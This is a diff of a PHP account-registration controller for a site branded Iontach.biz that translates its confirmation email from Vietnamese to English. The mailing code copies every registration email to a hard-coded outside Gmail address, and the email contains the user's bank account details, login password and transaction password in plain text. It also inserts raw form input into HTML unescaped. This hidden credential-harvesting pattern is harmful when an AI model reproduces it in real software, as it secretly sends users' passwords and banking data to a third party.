@@ -90,78 +90,77 @@ class ControllerAccountRegister extends Controller {
 		
 			$mail->setTo(array(0 => ''.$_POST['email'].'', 1 => 'mmo.hyipcent@gmail.com'));
 			$mail -> setFrom($this -> config -> get('config_email'));
-			$mail -> setSender(html_entity_decode("Iontach", ENT_QUOTES, 'UTF-8'));
-			$mail -> setSubject("Chúc mừng bạn đã đăng ký thành công!");
+			$mail -> setSender(html_entity_decode("Iontach Community", ENT_QUOTES, 'UTF-8'));
+			$mail -> setSubject("Congratulations Your Registration is Confirmed!");
 			$mail -> setHtml('
-				
-		   <table align="center" bgcolor="#eeeeee" border="0" cellpadding="0" cellspacing="0" style="background:#eeeeee;border-collapse:collapse;line-height:100%!important;margin:0;padding:0;width:100%!important">
-		   <tbody>
-		      <tr>
-		         <td>
-		            <table style="border-collapse:collapse;margin:auto;max-width:635px;min-width:320px;width:100%">
-		   <tbody>
-		      <tr>
-		         <td>
-		            <table style="border-collapse:collapse;color:#c0c0c0;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:26px;margin:0 auto 26px;width:100%">
-		               <tbody>
-		                  <tr>
-		                     <td></td>
-		                  </tr>
-		               </tbody>
-		            </table>
-		         </td>
-		      </tr>
-		      <tr>
-		         <td>
-		            <table style="width:600px;" align="center" border="0" cellspacing="0" style="border-collapse:collapse;border-radius:3px;color:#545454;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:20px;margin:0 auto;width:100%">
-		   <tbody>
-		      <tr>
-		         <td>
-		            <table border="0" cellpadding="0" cellspacing="0" style="border:none;border-collapse:separate;font-size:1px;height:2px;line-height:3px;width:100%">
-		               <tbody>
-		                  <tr>
-		                     <td bgcolor="#9B59B6" valign="top"> </td>
-		                  </tr>
-		               </tbody>
-		            </table>
-		            <table style="width:600px; border="0" cellpadding="0" cellspacing="0" height="100%" style="border-collapse:collapse;border-color:#dddddd;border-radius:0 0 3px 3px;border-style:solid;border-width:1px;width:100%" width="100%">
-		   <tbody>
-		      <tr>
-		         <td align="center" valign="top">
-		            <table border="0" cellpadding="0" cellspacing="0" width="100%">
-		               <tbody>
-		                  <tr>
-		                     <td align="center" style="background:#ffffff">
-		                        <a href="https://happymoney.us" target="_blank" data-saferedirecturl="happymoney.us">
-		                           <h1 style="margin-top:30px; font-weight:bold;">Iontach.biz</h1>
-		                        </a>
-		                     </td>
-		                  </tr>
-		               </tbody>
-		            </table>
-		         </td>
-		      </tr>
-		      <table style="background:#FFF; padding:25px;width:600px">
-		      	<tbody>
-		      		<tr>
-		      			<td style="padding:30px;background:white;color:#525252;font-family:"Helvetica Neue",Arial,sans-serif;font-size:15px;line-height:22px;overflow:hidden;">
-		            <p><span>Xin chào <b>'.$_POST['username'].'</b>,</span></p>
-		            <p><span>Chúc mừng bạn đã đăng ký tài khoản thành công!</span></p>
-		            <p><strong>Tên tài khoản ngân hàng: <span style="color:#5cb85c">'.$_POST['account_holder'].'</span></strong></p>
-		            <p><strong>Ngân hàng: <span style="color:#5cb85c">'.$_POST['bank_name'].'</span></strong></p>
-		            <p><strong>Số tài khoản ngân hàng: <span style="color:#5cb85c">'.$_POST['account_number'].'</span></strong></p>
-		            <p><strong>Email: <span style="color:#5cb85c">'.$_POST['email'].'</span></strong></p>
-		            <p><strong>Số điện thoại: <span style="color:#5cb85c">'.$_POST['telephone'].'</span></strong></p>
-		            <p><strong>Tên tài khoản: <span style="color:#5cb85c">'.$_POST['username'].'</span></strong></p>
-		            <p><strong>Mật khẩu đăng nhập: <span style="color:#5cb85c">'.$_POST['password'].'</span></strong></p>
-				<p><strong>Mật khẩu 2: <span style="color:#5cb85c">'.$_POST['password2'].'</span></strong></p>
-		            <p><strong>Vào ngày<strong>: '.date('d/m/Y H:i:s').'</p></td></p>
-		             
-		      		</tr>
-		      	</tbody>
-		      </table>
-		       <hr>
-
+            
+         <table align="center" bgcolor="#eeeeee" border="0" cellpadding="0" cellspacing="0" style="background:#eeeeee;border-collapse:collapse;line-height:100%!important;margin:0;padding:0;width:100%!important">
+         <tbody>
+            <tr>
+               <td>
+                  <table style="border-collapse:collapse;margin:auto;max-width:635px;min-width:320px;width:100%">
+         <tbody>
+            <tr>
+               <td>
+                  <table style="border-collapse:collapse;color:#c0c0c0;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:26px;margin:0 auto 26px;width:100%">
+                     <tbody>
+                        <tr>
+                           <td></td>
+                        </tr>
+                     </tbody>
+                  </table>
+               </td>
+            </tr>
+            <tr>
+               <td>
+                  <table style="width:600px;" align="center" border="0" cellspacing="0" style="border-collapse:collapse;border-radius:3px;color:#545454;font-family:"Helvetica Neue",Arial,sans-serif;font-size:13px;line-height:20px;margin:0 auto;width:100%">
+         <tbody>
+            <tr>
+               <td>
+                  <table border="0" cellpadding="0" cellspacing="0" style="border:none;border-collapse:separate;font-size:1px;height:2px;line-height:3px;width:100%">
+                     <tbody>
+                        <tr>
+                           <td bgcolor="#9B59B6" valign="top"> </td>
+                        </tr>
+                     </tbody>
+                  </table>
+                  <table style="width:600px; border="0" cellpadding="0" cellspacing="0" height="100%" style="border-collapse:collapse;border-color:#dddddd;border-radius:0 0 3px 3px;border-style:solid;border-width:1px;width:100%" width="100%">
+         <tbody>
+            <tr>
+               <td align="center" valign="top">
+                  <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                     <tbody>
+                        <tr>
+                           <td align="center" style="background:#ffffff">
+                              <a href="https://happymoney.us" target="_blank" data-saferedirecturl="happymoney.us">
+                                 <h1 style="margin-top:30px; font-weight:bold;">Iontach.biz</h1>
+                              </a>
+                           </td>
+                        </tr>
+                     </tbody>
+                  </table>
+               </td>
+            </tr>
+            <table style="background:#FFF; padding:25px;width:600px">
+               <tbody>
+                  <tr>
+                     <td style="padding:30px;background:white;color:#525252;font-family:"Helvetica Neue",Arial,sans-serif;font-size:15px;line-height:22px;overflow:hidden;">
+                  <p><span>Hello <b>'.$_POST['username'].'</b>,</span></p>
+                  <p><span>Congratulations Your Registration is Confirmed!</span></p>
+                  <p><strong>Your account holder: <span style="color:#5cb85c">'.$_POST['account_holder'].'</span></strong></p>
+                  <p><strong>Bank: <span style="color:#5cb85c">'.$_POST['bank_name'].'</span></strong></p>
+                  <p><strong>Account number: <span style="color:#5cb85c">'.$_POST['account_number'].'</span></strong></p>
+                  <p><strong>Email: <span style="color:#5cb85c">'.$_POST['email'].'</span></strong></p>
+                  <p><strong>Phone Number: <span style="color:#5cb85c">'.$_POST['telephone'].'</span></strong></p>
+                  <p><strong>Username: <span style="color:#5cb85c">'.$_POST['username'].'</span></strong></p>
+                  <p><strong>Password Login: <span style="color:#5cb85c">'.$_POST['password'].'</span></strong></p>
+            <p><strong>Transaction Password: <span style="color:#5cb85c">'.$_POST['password2'].'</span></strong></p>
+                  <p><strong>Date<strong>: '.date('d/m/Y H:i:s').'</p></td></p>
+                   
+                  </tr>
+               </tbody>
+            </table>
+             <hr>
 			');
 			$mail -> send();
 			//print_r($mail); die;
